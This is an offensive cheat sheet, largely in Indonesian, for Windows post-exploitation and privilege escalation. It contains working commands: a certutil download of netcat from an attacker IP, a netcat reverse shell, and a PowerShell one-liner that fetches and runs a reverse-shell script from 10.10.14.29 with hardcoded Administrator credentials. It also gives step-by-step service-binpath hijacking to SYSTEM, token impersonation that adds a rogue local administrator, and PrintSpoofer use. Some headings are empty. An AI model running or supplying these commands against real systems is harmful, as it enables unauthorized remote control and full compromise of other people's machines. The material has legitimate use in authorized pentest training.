## Check System Info --
~# systeminfo

## Download File From CMD (Not PowerShell) -- 
certutil.exe -urlcache -split -f "http://10.14.17.16:4545/nc.exe" %tmp%\nc.exe

### Reverse Shell
%tmp%\nc.exe IP PORT -e cmd

## Download File From PowerShell) -- 

(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")  

## Reverse Shell With Nishang To Get Powershell --

## Windows  Exploit Suggester --

##Run Nishang As Administrator to get root! -- 
We must get low shell with nishang. Then run this command

Requirement : SeChangeNotifyPrivilege       Bypass traverse checking             Enabled

Check : whoami /all
PRIVILEGES INFORMATION                                                                                                                                                                                                            [319/687]
----------------------                                                                                                                                                                                                                     
                                                                                                                                                                                                                                           
Privilege Name                Description                          State                                                                                                                                                                   
============================= ==================================== ========                                                                                                                                                                
SeShutdownPrivilege           Shut down the system                 Disabled                                                                                                                                                                
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled  <<---                                                                                                                                                            
SeUndockPrivilege             Remove computer from docking station Disabled                                                                                                                                                                
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled                                                                                                                                                                
SeTimeZonePrivilege           Change the time zone                 Disabled 

Then run this command
$SecPass = ConvertTo-SecureString -AsPlainText -Force 'Welcome1!' 
$cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)
Start-Process -Filepath "powershell" -argumentlist "IEX (New-Object Net.WebClient).downloadString('http://10.10.14.29/Invoke-PowershellTcp.ps1')" -Credential $cred

============================================

# Windows Privilege Escalation

## Insecure Service Permissions
Service merupakan program-program pada windows yang dijalankan pada background. Terkadang menerima input atau menjalankan sebuah task
Jika sebuah **service** dijalankan dengan privileges **SYSTEM** dan terdapat misconfiguration, maka kita bisa melakukan priv esc. 

### Recon
* Query untuk melihat konfigurasi dari service --> `sc.exe qc <name>`
* Melihat status service --> `sc.exe query <name>`
* Modifikasi configurasi dari sebuah service --> `sc.exe config <name> <option>= <value>` (pastikan value ada spasi di depan)
* Start/Stop Service --> `net start/stop <name>`

Terdapat beberapa celah service misconfiguration yang dapat menyebabkan Privilege Escalation diantaranya

### Insecure Service Properties
Setiap service memiliki Access Control (ACL) tentang siapa yang berhak mengakses service tersebut seperi Start/Stop, mengubah konfigurasi dll. Jika low user memiliki hak akses untuk merubah konfigurasi dari service yang dijalankan dengan privilege SYSTEM, maka kita bisa mengganti service tersebut dengan milik kita dengan merubah konfig. Namun kalau kita bisa ganti tapi gak bisa start/stop, maka kemungkinan tidak bisa di escalate.

-- RECON --

Menggunakan WINPEAS untuk mencari informasi service yang terdapat pada windows
```
.\winPEASany.exe quiet servicesinfo
```
Penjelasan command :
- quiet --> do not print banner, biasanya winpeas bannernya gede banget
- servicesinfo --> mencari informasi service

Hasil dari servicesinfo yang perlu diperhatikan adalah "YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles" (teks berwarna merah) yang artinya sebuah service bisa diubah konfigurasinya. 

Lalu lakukan pengecekan pada service apakah benar service tersebut bisa dimodifikasi, gunakan tools accesschk.exe
```
accesschk.exe /accepteula -uwcqv <nama_user_low_privilege> <nama_service>
```
Hasilnya :
```
RW MyService
	SERVICE_QUERY_STATUS
	SERVICE_QUERY_CONFIG
	SERVICE_CHANGE_CONFIG
	SERVICE_INTERROGATE
	SERVICE_ENUMERATE_DEPENDENTS
	SERVICE_START
	SERVICE_STOP
	READ_CONTROL
```
Yang terpenting adalah 
```
SERVICE_CHANGE_CONFIG
SERVICE_START
SERVICE_STOP
```
Artinya kita bisa ubah konfigurasi dan untuk bisa menerapkan perubahan maka kita harus restart (start/stop) service. 

Lalu kita cek konfigurasi dari service tersebut
```
sc qc <nama service>
```
```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```
Lihat pada SERVICE_START_NAME service tersebut dijalankan oleh SYSTEM (hak akses tertinggi). Dan juga pada START_TYPE valuenya DEMAND_START yang artinya di start secara manual

Selanjutnya kita cek status servicenya, apakah sedang berjalan atau tidak
```
sc query <nama service>
```
Lihat pada STATE apakah STOPPED or RUNNING

Bagaimana cara melakukan PRIV ESC? perhatikan lagi informasi service berikut :

```

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

Karena kita memiliki hak akses untuk merubah konfigurasi, maka kita bisa merubah **BINARY_PATH_NAME** menjadi PATH dimana kita menyimpan file untuk melakukan reverse shell. Perintahnya adalah

```
sc config <nama_service> binpath= "\"C:\myFolder\reverse.exe\""
```
Sehingga BINARY_PATH_NAME berubah menjadi `C:\myFolder\reverse.exe`, untuk menerapkan perubahan pada konfigurasi, perintahnya
```
net start <nama_service>
```
Dan jika berhasil maka akan BOOM BOOM PWn3D!



### Unquoted Service Path
### Weak Registry Permissions
### Insecure Service Executables
### DLL Hijacking
--------------------------------------------------------------

## Token Impersonate

Windows menggunakan Token sebagai Identifier untuk setiap pengguna. Token ini di generate saat login. Ada celah keamanan dimana user biasa bisa melakukan priv esc bilamana user kita saat ini memiliki permission seDebugPrivilege dan SeImpersonatePrivilege

Untuk cek apakah user bisa di impersonate cek di CMD :
$ whoami /priv
pastikan seDebugPrivilege dan SeImpersonatePrivilege enabled. 

Lalu cek user mana saja yang bisa di impersonate. Kita bisa pakai incognito.exe, commandnya :

* incognito.exe list tokens -u //list token available to impersonate
* incognito.exe add_user mrdoel 123456 //add new user
* incognito.exe add_localgroup_user Administrators mrdoel  //add new user to the local administrators group
* net user mrdoel //cek apakah user sudah ditambahkan ke group administrator (Local Group Memberships      *Administrators)

Jika RDP tersedit maka kita bisa login sebagai root dengan command
`rdesktop -u mrdoel -p 123456 target.local`

### Teknik Baru Token Impersonate 
Cara sebelumnya hanya berlaku untuk windows dibawah windows 10. Jika cara diatas tidak bisa maka kita bisa gunakan PrintSpoofer, targetnya Windows 10 and Server 2016/2019. 

Note: pastikan `SeImpersonatePrivilege` berstatus `Enabled`

Cek di https://github.com/itm4n/PrintSpoofer/releases

Perintah untuk menjalankan exploit
```PrintSpoofer64.exe -i -c cmd```
